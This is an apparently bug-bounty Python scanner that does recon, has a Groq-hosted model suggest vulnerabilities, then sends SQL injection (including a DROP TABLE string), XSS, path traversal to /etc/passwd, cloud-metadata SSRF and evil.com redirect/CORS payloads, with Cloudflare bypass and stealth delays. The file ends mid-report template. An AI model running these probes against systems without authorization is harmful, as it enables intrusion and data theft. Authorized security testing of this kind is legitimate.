#!/usr/bin/env python3
"""
BugHunt.ai - Automated Bug Bounty Reconnaissance Framework
Groq API Edition (Free) - v2.1
Cloudflare bypass + UA rotation + retry logic.
"""

import asyncio
import subprocess
import sys
import os
import json
import time
import re
import random
import urllib3
from typing import List, Dict, Optional
from urllib.parse import urlparse, urlencode

# Suppress SSL warnings — intentional for bug bounty
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import cloudscraper
    from groq import Groq
except ImportError:
    print("[!] Missing dependencies. Run: pip3 install -r requirements_groq.txt")
    sys.exit(1)

# ============ UA ROTATION ============
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

def random_headers() -> Dict:
    ua = random.choice(USER_AGENTS)
    return {
        "User-Agent": ua,
        "Accept": "application/json, text/html, */*;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Cache-Control": "max-age=0",
    }

# ============ CONFIG ============
TOOLS = {
    "subfinder": "github.com/projectdiscovery/subfinder/v2/cmd/subfinder",
    "naabu":     "github.com/projectdiscovery/naabu/v2/cmd/naabu",
    "httpx":     "github.com/projectdiscovery/httpx/cmd/httpx",
    "nuclei":    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei",
    "waybackurls":"github.com/tomnomnom/waybackurls",
    "gau":       "github.com/lc/gau/v2/cmd/gau",
    "katana":    "github.com/projectdiscovery/katana/cmd/katana",
}

PIP_PACKAGES = ["groq>=0.9.0", "cloudscraper>=1.2.71", "requests>=2.31.0"]
APT_PACKAGES  = ["golang-go", "git", "curl", "jq", "whatweb"]

# Use random_headers() everywhere — no static HEADERS dict

# ============ PAYLOADS ============
SQLI_PAYLOADS = [
    "'", "\"", "1'", "1\"",
    "' OR '1'='1'--", "\" OR \"1\"=\"1\"--",
    "1 AND 1=2", "1 AND SLEEP(0)--",
    "'; SELECT 1--", "1; DROP TABLE--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "postgresql error",
    "pg_query()",
    "syntax error at or near",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "sqlite_master",
    "column count doesn't match",
    "supplied argument is not a valid mysql",
]

SSRF_INDICATORS = [
    "169.254.169.254",
    "instance-data",
    "ami-id",
    "iam/security-credentials",
    "internal server error",
    "connection refused",
    "connection timed out to internal",
]

LFI_INDICATORS = [
    "root:x:0:0",
    "bin:x:",
    "[boot loader]",
    "[extensions]",
    "for 16-bit app support",
    "/sbin/nologin",
    "daemon:x:",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2f@target",
    "/\\evil.com",
    "https:evil.com",
]

SECURITY_HEADERS = [
    "x-frame-options",
    "x-content-type-options",
    "strict-transport-security",
    "content-security-policy",
    "x-xss-protection",
    "referrer-policy",
    "permissions-policy",
]

# ============ HELPERS ============

def run_cmd(cmd: str, timeout: int = 120) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        print(f"[!] Timeout: {cmd[:60]}")
        return ""
    except Exception:
        return ""

def get_session() -> cloudscraper.CloudScraper:
    """Cloudscraper session — bypasses Cloudflare JS challenges."""
    scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "windows", "mobile": False}
    )
    scraper.headers.update(random_headers())
    scraper.verify = False
    return scraper

def cf_request(session: cloudscraper.CloudScraper, method: str, url: str,
               retries: int = 3, **kwargs) -> Optional[object]:
    """
    Request with:
    - Cloudflare bypass via cloudscraper
    - Random UA per retry
    - Exponential backoff on 403/429/503
    - Random delay between requests (stealth)
    """
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", False)

    # Random delay 0.5-2s between requests (avoid rate limiting)
    time.sleep(random.uniform(0.5, 2.0))

    for attempt in range(retries):
        try:
            session.headers.update(random_headers())
            if method.upper() == "GET":
                r = session.get(url, **kwargs)
            else:
                r = session.post(url, **kwargs)

            if r.status_code in [429, 503]:
                wait = 2 ** attempt + random.uniform(1, 3)
                print(f"[!] Rate limited ({r.status_code}), waiting {wait:.1f}s...")
                time.sleep(wait)
                continue

            if r.status_code == 403:
                # CF block — rotate UA and retry
                session.headers.update(random_headers())
                time.sleep(random.uniform(2, 5))
                continue

            return r

        except Exception as e:
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
            continue

    return None

def make_url(target: str, endpoint: str) -> str:
    if target.startswith("http"):
        return target.rstrip("/") + endpoint
    return "https://" + target + endpoint

def is_spa_response(text: str) -> bool:
    """Detect SPA/React/Vue apps returning HTML instead of API data."""
    spa_markers = [
        "<div id=\"root\">",
        "<div id=\"app\">",
        "window.__INITIAL_STATE__",
        "bundle.js",
        "chunk.js",
        "application/json",
    ]
    # If response has HTML doctype + SPA markers = not real API response
    if "<!doctype html" in text.lower() or "<html" in text.lower():
        for m in spa_markers:
            if m in text:
                return True
        return True  # Any HTML is not an API response
    return False

def is_json_response(r: requests.Response) -> bool:
    ct = r.headers.get("content-type", "")
    return "application/json" in ct

# ============ SETUP ============

def check_tool(name: str) -> bool:
    return subprocess.run(f"which {name}", shell=True,
                          capture_output=True).returncode == 0

def install_apt(pkg: str):
    if check_tool(pkg.split()[0]):
        print(f"[+] {pkg} already installed")
        return
    print(f"[*] Installing {pkg}...")
    r = subprocess.run(f"sudo apt install -y {pkg}", shell=True, capture_output=True, text=True)
    print(f"[+] {pkg} installed" if r.returncode == 0 else f"[!] Failed: {pkg}")

def install_go_tool(name: str, repo: str):
    if check_tool(name):
        print(f"[+] {name} already installed")
        return
    print(f"[*] Installing {name}...")
    r = subprocess.run(f"go install {repo}@latest", shell=True,
                       capture_output=True, text=True, timeout=180)
    print(f"[+] {name} installed" if r.returncode == 0 else f"[!] Failed: {name}")

def setup():
    print("""
╔═══════════════════════════════════════╗
║     🔧 BugHunt.ai v2 Setup            ║
║     Groq Edition (FREE)               ║
╚═══════════════════════════════════════╝
""")
    if "linux" not in sys.platform.lower():
        print("[!] Linux required.")
        sys.exit(1)
    if not check_tool("go"):
        print("[!] Go required. Install from golang.org")
        sys.exit(1)
    print("[+] Go found")
    for pkg in APT_PACKAGES:
        install_apt(pkg)
    for name, repo in TOOLS.items():
        install_go_tool(name, repo)
    print("""
╔═══════════════════════════════════════╗
║  ✅ Setup Complete!                   ║
║  export GROQ_API_KEY="your-key"       ║
║  python3 bughunt_groq.py hunt <url>   ║
╚═══════════════════════════════════════╝
""")

# ============ PHASE 1: RECON ============

def recon(target: str) -> Dict:
    print(f"\n[*] PHASE 1: RECON on {target}\n")
    results = {
        "target": target,
        "subdomains": [],
        "live_hosts": [],
        "ports": [],
        "urls": [],
        "tech": "",
        "js_files": [],
    }

    # Subdomains
    print("[*] Enumerating subdomains (subfinder)...")
    out = run_cmd(f"subfinder -d {target} -silent -t 100", timeout=180)
    results["subdomains"] = [s.strip() for s in out.split("\n") if s.strip()]
    # Always include the target itself
    if target not in results["subdomains"]:
        results["subdomains"].insert(0, target)
    print(f"[+] Found {len(results['subdomains'])} subdomains")

    # Live hosts
    print("[*] Checking live hosts (httpx)...")
    subs_str = "\n".join(results["subdomains"][:30])
    out = run_cmd(
        f"echo '{subs_str}' | httpx -silent -status-code -title -timeout 8 -follow-redirects",
        timeout=120
    )
    results["live_hosts"] = [h.strip() for h in out.split("\n") if h.strip()]
    print(f"[+] Found {len(results['live_hosts'])} live hosts")

    # Port scan
    print("[*] Port scanning (naabu)...")
    out = run_cmd(
        f"naabu -host {target} -top-ports 1000 -rate 500 -silent",
        timeout=300
    )
    results["ports"] = [p.strip() for p in out.split("\n") if p.strip()]
    print(f"[+] Found {len(results['ports'])} open ports")

    # Historical URLs via gau (better than waybackurls)
    print("[*] Fetching URLs (gau + waybackurls)...")
    out1 = run_cmd(f"echo {target} | gau --threads 5", timeout=120)
    out2 = run_cmd(f"echo {target} | waybackurls", timeout=120)
    all_urls = set()
    for line in (out1 + "\n" + out2).split("\n"):
        u = line.strip()
        if u and target in u:
            all_urls.add(u)
    results["urls"] = list(all_urls)[:200]
    print(f"[+] Found {len(results['urls'])} URLs")

    # JS files from URLs
    results["js_files"] = [u for u in results["urls"] if u.endswith(".js")][:20]

    # Tech stack
    print("[*] Detecting tech stack (whatweb)...")
    out = run_cmd(f"whatweb -a 3 https://{target} 2>/dev/null", timeout=60)
    results["tech"] = out[:800]
    print(f"[+] Tech detected")

    # Crawl with katana for fresh endpoints
    print("[*] Crawling (katana)...")
    out = run_cmd(
        f"katana -u https://{target} -d 2 -silent -jc -timeout 10",
        timeout=120
    )
    katana_urls = [u.strip() for u in out.split("\n") if u.strip() and target in u]
    results["urls"] = list(set(results["urls"] + katana_urls))[:300]
    print(f"[+] Total {len(results['urls'])} URLs after crawl")

    return results

# ============ PHASE 2: FILTER SCOPE ============

def filter_scope(recon_data: Dict, scope: str) -> Dict:
    print(f"\n[*] PHASE 2: FILTERING BY SCOPE\n")
    allowed = set(s.strip() for s in scope.split("\n") if s.strip())

    filtered_subs = [
        s for s in recon_data["subdomains"]
        if any(a in s for a in allowed)
    ]
    filtered_urls = [
        u for u in recon_data["urls"]
        if any(a in u for a in allowed)
    ]

    # Prioritize interesting URLs
    interesting_patterns = [
        "api", "admin", "login", "auth", "user", "account",
        "upload", "file", "download", "redirect", "url=",
        "id=", "search", "query", "token", "password", "reset",
        "register", "signup", "oauth", "callback",
    ]
    priority_urls = [
        u for u in filtered_urls
        if any(p in u.lower() for p in interesting_patterns)
    ]
    other_urls = [u for u in filtered_urls if u not in priority_urls]
    filtered_urls = priority_urls + other_urls

    result = {**recon_data, "subdomains": filtered_subs, "urls": filtered_urls}
    print(f"[+] Filtered to {len(filtered_subs)} in-scope subdomains")
    print(f"[+] Filtered to {len(filtered_urls)} in-scope URLs ({len(priority_urls)} priority)")
    return result

# ============ PHASE 3: GROQ HYPOTHESES ============

def get_hypotheses(recon_data: Dict, target: str) -> List[Dict]:
    print(f"\n[*] PHASE 3: GENERATING HYPOTHESES (Groq AI)\n")

    groq_api_key = os.getenv("GROQ_API_KEY")
    if not groq_api_key:
        print("[!] GROQ_API_KEY not set. Get free key: https://console.groq.com")
        return []

    client = Groq(api_key=groq_api_key)

    # Build a rich prompt with actual data
    url_sample = recon_data["urls"][:20]
    port_list  = recon_data["ports"][:10]
    sub_list   = recon_data["subdomains"][:10]
    js_list    = recon_data.get("js_files", [])[:5]

    prompt = f"""You are an elite bug bounty hunter. Analyze this recon data and generate specific, testable vulnerability hypotheses.

TARGET: {target}
TECH STACK: {recon_data['tech'][:400]}
OPEN PORTS: {', '.join(port_list) if port_list else 'unknown'}
SUBDOMAINS: {', '.join(sub_list)}
JS FILES: {', '.join(js_list)}
DISCOVERED URLS (sample):
{chr(10).join(url_sample)}

RULES:
- Only suggest vulns that make sense for the tech stack
- For IDOR: only suggest if you see /api/ or /v1/ or numeric IDs in URLs
- For SQLi: only suggest if URL has parameters like ?id= ?search= ?q=
- For XSS: only suggest if URL has reflected parameters
- For Open Redirect: only suggest if you see ?url= ?redirect= ?next= ?return=
- For SSRF: only suggest if app fetches URLs (webhooks, imports, previews)
- For Broken Auth: suggest if you see /api/admin or /api/internal
- DO NOT suggest IDOR for SPA homepages with no API paths visible
- Each hypothesis must have a real specific endpoint from the data above

RESPOND ONLY WITH VALID JSON ARRAY. NO MARKDOWN. NO EXTRA TEXT.
Format:
[
  {{"endpoint": "/api/v1/users/1", "method": "GET", "vuln_type": "IDOR", "params": {{"id": "1"}}, "reason": "Numeric user ID in REST API path, try incrementing"}},
  {{"endpoint": "/search", "method": "GET", "vuln_type": "XSS", "params": {{"q": "FUZZ"}}, "reason": "Search parameter reflected in response"}}
]

vuln_type must be one of: SQLi, XSS, IDOR, LFI, SSRF, OpenRedirect, BrokenAuth, MissingHeaders, CORS
Max 15 hypotheses. ONLY JSON."""

    try:
        print("[*] Calling Groq API...")
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000,
            temperature=0.2,
        )
        text = response.choices[0].message.content.strip()

        # Strip markdown fences if present
        text = re.sub(r"```json|```", "", text).strip()

        start = text.find("[")
        end = text.rfind("]") + 1
        if start >= 0 and end > start:
            hypotheses = json.loads(text[start:end])
            print(f"[+] Generated {len(hypotheses)} hypotheses")
            return hypotheses
        else:
            print("[!] Could not parse Groq JSON response")
            return []
    except Exception as e:
        print(f"[!] Groq error: {e}")
        return []

# ============ PHASE 4: VULN TESTING ============

def test_sqli(url: str, params: Dict, session) -> Optional[Dict]:
    """Real SQLi: check for DB error strings in response."""
    for payload in SQLI_PAYLOADS:
        try:
            test_params = {k: payload for k in params}
            r = cf_request(session, "GET", url, params=test_params)
            if r is None or is_spa_response(r.text):
                return None
            text_lower = r.text.lower()
            for err in SQLI_ERRORS:
                if err in text_lower:
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "evidence": f"DB error: '{err}' found in response",
                        "poc": f"curl -g '{url}?{list(params.keys())[0]}={payload}'",
                        "response_sample": r.text[:500],
                    }
        except Exception:
            pass
    return None

def test_xss(url: str, params: Dict, session) -> Optional[Dict]:
    """Real XSS: payload must be reflected unencoded in response body."""
    for payload in XSS_PAYLOADS:
        try:
            test_params = {k: payload for k in params}
            r = cf_request(session, "GET", url, params=test_params)
            if r is None or is_spa_response(r.text):
                return None
            if payload in r.text and "text/html" in r.headers.get("content-type", ""):
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "evidence": "Payload reflected unencoded in HTML response",
                    "poc": f"curl -g '{url}?{list(params.keys())[0]}={payload}'",
                    "response_sample": r.text[:500],
                }
        except Exception:
            pass
    return None

def test_idor(url: str, session) -> Optional[Dict]:
    """Real IDOR: hit endpoint with id=1 and id=2, compare responses."""
    try:
        r1 = cf_request(session, "GET", url, params={"id": "1"})
        r2 = cf_request(session, "GET", url, params={"id": "2"})
        if r1 is None or r2 is None:
            return None
        if is_spa_response(r1.text) or is_spa_response(r2.text):
            return None
        if not is_json_response(r1) or not is_json_response(r2):
            return None
        if r1.status_code != 200 or r2.status_code != 200:
            return None
        if len(r1.text) < 10 or len(r2.text) < 10:
            return None
        if r1.text.strip() == r2.text.strip():
            return None
        return {
            "vulnerable": True,
            "payload": "id=1 vs id=2",
            "evidence": f"Both IDs return 200 JSON with different data. Verify manually.",
            "poc": f"curl '{url}?id=1' && curl '{url}?id=2'",
            "response_sample": r1.text[:300],
        }
    except Exception:
        pass
    return None

def test_lfi(url: str, params: Dict, session) -> Optional[Dict]:
    """Real LFI: check for /etc/passwd or win.ini content in response."""
    lfi_payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
    ]
    for payload in lfi_payloads:
        try:
            test_params = {k: payload for k in params}
            r = cf_request(session, "GET", url, params=test_params)
            if r is None:
                continue
            for indicator in LFI_INDICATORS:
                if indicator in r.text:
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "evidence": f"LFI confirmed: '{indicator}' in response",
                        "poc": f"curl -g '{url}?{list(params.keys())[0]}={payload}'",
                        "response_sample": r.text[:500],
                    }
        except Exception:
            pass
    return None

def test_ssrf(url: str, params: Dict, session) -> Optional[Dict]:
    """SSRF: test with metadata IP and check for cloud metadata keywords."""
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    for payload in ssrf_targets:
        try:
            test_params = {k: payload for k in params}
            r = cf_request(session, "GET", url, params=test_params)
            if r is None or is_spa_response(r.text):
                continue
            for ind in SSRF_INDICATORS:
                if ind in r.text.lower():
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "evidence": f"SSRF indicator '{ind}' in response",
                        "poc": f"curl -g '{url}?url={payload}'",
                        "response_sample": r.text[:500],
                    }
        except Exception:
            pass
    return None

def test_open_redirect(url: str, params: Dict, session) -> Optional[Dict]:
    """Open redirect: check if response redirects to our payload domain."""
    for payload in OPEN_REDIRECT_PAYLOADS:
        try:
            test_params = {k: payload for k in params}
            r = cf_request(session, "GET", url, params=test_params, allow_redirects=False)
            if r is None:
                continue
            location = r.headers.get("location", "")
            if r.status_code in [301, 302, 303, 307, 308]:
                if "evil.com" in location:
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "evidence": f"Redirects to: {location}",
                        "poc": f"curl -I '{url}?{list(params.keys())[0]}={payload}'",
                        "response_sample": f"Location: {location}",
                    }
        except Exception:
            pass
    return None

def test_missing_headers(url: str, session) -> Optional[Dict]:
    """Check for missing security headers on the main page."""
    try:
        r = cf_request(session, "GET", url)
        if r is None:
            return None
        headers_lower = {k.lower(): v for k, v in r.headers.items()}
        missing = [h for h in SECURITY_HEADERS if h not in headers_lower]
        if len(missing) >= 3:
            return {
                "vulnerable": True,
                "payload": "N/A",
                "evidence": f"Missing security headers: {', '.join(missing)}",
                "poc": f"curl -I '{url}'",
                "response_sample": "\n".join(f"{k}: {v}" for k, v in list(headers_lower.items())[:10]),
            }
    except Exception:
        pass
    return None

def test_cors(url: str, session) -> Optional[Dict]:
    """Check for misconfigured CORS."""
    try:
        evil_origin = "https://evil.com"
        r = cf_request(session, "GET", url, headers={**random_headers(), "Origin": evil_origin})
        if r is None:
            return None
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "*" or acao == evil_origin:
            creds = " + credentials=true" if acac.lower() == "true" else ""
            return {
                "vulnerable": True,
                "payload": f"Origin: {evil_origin}",
                "evidence": f"CORS reflects arbitrary origin{creds}. ACAO: {acao}",
                "poc": f"curl -H 'Origin: {evil_origin}' -I '{url}'",
                "response_sample": f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
            }
    except Exception:
        pass
    return None

def test_broken_auth(url: str, session) -> Optional[Dict]:
    """Check if admin/internal API endpoints return 200 without auth."""
    admin_paths = [
        "/api/admin", "/api/v1/admin", "/api/internal",
        "/admin/api", "/api/users", "/api/v1/users",
        "/api/config", "/api/debug", "/api/env",
    ]
    base = url.rstrip("/")
    for path in admin_paths:
        try:
            r = cf_request(session, "GET", base + path)
            if r is None:
                continue
            if r.status_code == 200 and is_json_response(r) and len(r.text) > 20:
                if not is_spa_response(r.text):
                    return {
                        "vulnerable": True,
                        "payload": path,
                        "evidence": f"Admin endpoint accessible without auth: HTTP 200 JSON",
                        "poc": f"curl '{base + path}'",
                        "response_sample": r.text[:300],
                    }
        except Exception:
            pass
    return None

async def test_hypothesis(target: str, hyp: Dict, session) -> Optional[Dict]:
    """Test a single Groq hypothesis with the right detector."""
    endpoint  = hyp.get("endpoint", "/")
    vuln_type = hyp.get("vuln_type", "").lower()
    params    = hyp.get("params", {"id": "1"})
    url       = make_url(target, endpoint)

    finding = None

    if vuln_type == "sqli":
        finding = test_sqli(url, params, session)
    elif vuln_type == "xss":
        finding = test_xss(url, params, session)
    elif vuln_type == "idor":
        finding = test_idor(url, session)
    elif vuln_type == "lfi":
        finding = test_lfi(url, params, session)
    elif vuln_type == "ssrf":
        finding = test_ssrf(url, params, session)
    elif vuln_type == "openredirect":
        finding = test_open_redirect(url, params, session)
    elif vuln_type == "missingheaders":
        finding = test_missing_headers(url, session)
    elif vuln_type == "cors":
        finding = test_cors(url, session)
    elif vuln_type == "brokenauth":
        finding = test_broken_auth(url, session)

    if finding and finding.get("vulnerable"):
        return {
            "endpoint":        endpoint,
            "vuln_type":       hyp.get("vuln_type", vuln_type),
            "reason":          hyp.get("reason", ""),
            "payload":         finding["payload"],
            "evidence":        finding["evidence"],
            "poc":             finding["poc"],
            "response_sample": finding.get("response_sample", ""),
        }
    return None

# ============ PHASE 4b: NUCLEI SCAN ============

def run_nuclei(target: str, urls: List[str]) -> List[Dict]:
    """Run nuclei against target with community templates."""
    print(f"\n[*] PHASE 4b: NUCLEI SCAN\n")
    findings = []

    if not check_tool("nuclei"):
        print("[!] nuclei not installed. Run: python3 bughunt_groq.py setup")
        return []

    # Update templates silently
    run_cmd("nuclei -update-templates -silent 2>/dev/null", timeout=60)

    # Write URLs to temp file
    url_file = f"/tmp/bughunt_urls_{int(time.time())}.txt"
    base_url = f"https://{target}"
    all_targets = list(set([base_url] + urls[:50]))
    with open(url_file, "w") as f:
        f.write("\n".join(all_targets))

    # Run nuclei — critical+high severity, common tags
    print(f"[*] Running nuclei on {len(all_targets)} targets...")
    out = run_cmd(
        f"nuclei -l {url_file} -severity critical,high,medium "
        f"-tags cve,exposure,misconfig,takeover,default-login "
        f"-silent -json -timeout 10 2>/dev/null",
        timeout=300
    )

    # Parse JSON output (one JSON per line)
    for line in out.split("\n"):
        line = line.strip()
        if not line:
            continue
        try:
            item = json.loads(line)
            findings.append({
                "endpoint":        item.get("matched-at", target),
                "vuln_type":       f"Nuclei:{item.get('info', {}).get('name', 'Unknown')}",
                "reason":          item.get("info", {}).get("description", ""),
                "payload":         item.get("template-id", ""),
                "evidence":        f"Severity: {item.get('info', {}).get('severity', '?')}",
                "poc":             f"nuclei -u {item.get('matched-at', '')} -t {item.get('template-id', '')}",
                "response_sample": str(item.get("extracted-results", ""))[:300],
            })
        except Exception:
            pass

    # Cleanup
    try:
        os.remove(url_file)
    except Exception:
        pass

    print(f"[+] Nuclei found {len(findings)} issues")
    return findings

async def test_all(target: str, hypotheses: List[Dict], urls: List[str]) -> List[Dict]:
    """Phase 4: Test all hypotheses + run nuclei."""
    print(f"\n[*] PHASE 4: TESTING {len(hypotheses)} HYPOTHESES (PARALLEL)\n")

    session = get_session()
    tasks = [test_hypothesis(target, h, session) for h in hypotheses]
    results = await asyncio.gather(*tasks)
    vulns = [r for r in results if r is not None]
    print(f"[+] Hypothesis testing: {len(vulns)} confirmed findings")

    # Also run nuclei
    nuclei_findings = run_nuclei(target, urls)
    vulns += nuclei_findings

    print(f"[+] Total confirmed findings: {len(vulns)}")
    return vulns

# ============ PHASE 5: REPORT ============

SEVERITY_MAP = {
    "SQLi": "critical", "LFI": "critical", "RCE": "critical",
    "SSRF": "high", "IDOR": "high", "BrokenAuth": "high",
    "XSS": "medium", "CORS": "medium", "OpenRedirect": "medium",
    "MissingHeaders": "low",
}

def get_severity(vuln_type: str) -> str:
    for k, v in SEVERITY_MAP.items():
        if k.lower() in vuln_type.lower():
            return v
    if "nuclei:" in vuln_type.lower():
        return "medium"
    return "medium"

SEVERITY_COLOR = {
    "critical": "#ff0000",
    "high":     "#ff6b00",
    "medium":   "#ffa500",
    "low":      "#ffff00",
}

def generate_report(target: str, vulns: List[Dict], recon_data: Dict) -> str:
    critical = [v for v in vulns if get_severity(v["vuln_type"]) == "critical"]
    high     = [v for v in vulns if get_severity(v["vuln_type"]) == "high"]
    medium   = [v for v in vulns if get_severity(v["vuln_type"]) == "medium"]
    low      = [v for v in vulns if get_severity(v["vuln_type"]) == "low"]

    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BugHunt Report - {target}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
            color: #e0e0e0;
            padding: 40px 20px;
            min-height: 100vh;
        }}
        .container {{ max-width: 960px; margin: 0 auto; }}
        .header {{
            text-align: center;
            margin-bottom: 40px;
            border-bottom: 2px solid #00d4ff;
            padding-bottom: 20px;
        }}
        .header h1 {{ color: #00d4ff; font-size: 2.5em; margin-bottom: 10px; }}
        .badge {{
            display: inline-block;
            background: #00d4ff; color: #000;
            padding: 5px 12px; border-radius: 3px;
            font-size: 0.8em; font-weight: bold; margin: 5px 2px;
        }}
        .badge.warn {{ background: #ff6b00; color: #fff; }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px; margin: 30px 0;
        }}
        .stat-box {{
            background: #1a1f3a;
            border: 1px solid #00d4ff;
            padding: 18px; border-radius: 5px; text-align: center;
        }}
        .stat-box .number {{ color: #00d4ff; font-size: 2em; font-weight: bold; }}
        .stat-box .label {{ color: #888; font-size: 0.85em; margin-top: 5px; }}
        .stat-box.crit {{ border-color: #ff0000; }}
        .stat-box.crit .number {{ color: #ff0000; }}
        .stat-box.high {{ border-color: #ff6b00; }}
        .stat-box.high .number {{ color: #ff6b00; }}
        .vuln {{
            background: #1a1f3a;
            padding: 20px; margin: 20px 0; border-radius: 5px;
        }}
        .vuln h3 {{ margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }}
        .sev-badge {{
            padding: 3px 8px; border-radius: 3px;
            font-size: 0.75em; font-weight: bold; text-transform: uppercase;
        }}
        .vuln-detail {{ margin: 8px 0; padding: 8px 0; border-bottom: 1px solid #2a2f4a; }}
        .vuln-detail strong {{ color: #00d4ff; }}
        pre {{
            background: #0d0d0d; padding: 12px; border-radius: 3px;
            overflow-x: auto; margin: 8px 0;
            border: 1px solid #333; color: #00ff88;
            white-space: pre-wrap; word-break: break-all;
        }}
        .recon-section {{
            background: #1a1f3a; padding: 20px;
            border-radius: 5px; margin: 20px 0;
        }}
        .recon-section h2 {{ color: #00d4ff; margin-bottom: 15px; }}
        .recon-item {{ padding: 4px 0; color: #aaa; font-size: 0.9em; }}
        .footer {{
            text-align: center; margin-top: 40px;
            padding-top: 20px; border-top: 1px solid #333;
            color: #666; font-size: 0.9em;
        }}
        h2.section-title {{ color: #00d4ff; margin: 30px 0 15px; }}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔍 BugHunt Report</h1>
        <p>Automated Reconnaissance &amp; Vulnerability Analysis</p>
        <p style="margin-top:10px;color:#00d4ff;">Target: <strong>{target}</strong></p>
        <span class="badge">Groq AI Powered (Free)</span>
        <span class="badge">v2.0</span>
    </div>

    <div class="stats">
        <div class="stat-box">
            <div class="number">{len(vulns)}</div>
            <div class="label">Total Findings</div>
        </div>
        <div class="stat-box crit">
            <div class="number">{len(critical)}</div>
            <div class="label">Critical</div>
        </div>
        <div class="stat-box high">
            <div class="number">{len(high)}</div>
            <div class="label">High</div>
        </div>
        <div class="stat-box">
            <div class="number">{len(medium)}</div>
            <div class="label">Medium</div>
        </div>
        <div class="stat-box">
            <div class="number">{len(recon_data.get('subdomains', []))}</div>
            <div class="label">Subdomains</div>
        </div>
        <div class="stat-box">
            <div class="number" style="font-size:0.9em;">{time.strftime('%Y-%m-%d %H:%M')}</div>
            <div class="label">Scan Time</div>
        </div>
    </div>
"""

    # Recon summary
    html += f"""
    <div class="recon-section">
        <h2>📡 Recon Summary</h2>
        <div class="recon-item">🔗 Subdomains: {', '.join(recon_data.get('subdomains', [])[:10])}</div>
        <div class="recon-item">🟢 Live Hosts: {', '.join(recon_data.get('live_hosts', [])[:5])}</div>
        <div class="recon-item">🔌 Open Ports: {', '.join(recon_data.get('ports', [])[:10])}</div>
        <div class="recon-item">🌐 URLs Found: {len(recon_data.get('urls', []))}</div>
        <div class="recon-item">⚙️ Tech: {recon_data.get('tech', 'N/A')[:300]}</div>
    </div>
"""

    if not vulns:
        html += """
    <div style="text-align:center;padding:40px;color:#888;">
        <p style="font-size:1.2em;">✅ No vulnerabilities confirmed in automated scan.</p>
        <p style="margin-top:10px;">Manual testing recommended — especially for auth-required endpoints.</p>
    </div>
"""
    else:
        html += "<h2 class='section-title'>🔴 Confirmed Findings</h2>\n"
        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        vulns_sorted = sorted(vulns, key=lambda v: severity_order.get(get_severity(v["vuln_type"]), 4))

        for i, vuln in enumerate(vulns_sorted, 1):
            sev = get_severity(vuln["vuln_type"])
            color = SEVERITY_COLOR.get(sev, "#aaa")
            html += f"""
    <div class="vuln" style="border-left: 4px solid {color};">
        <h3>
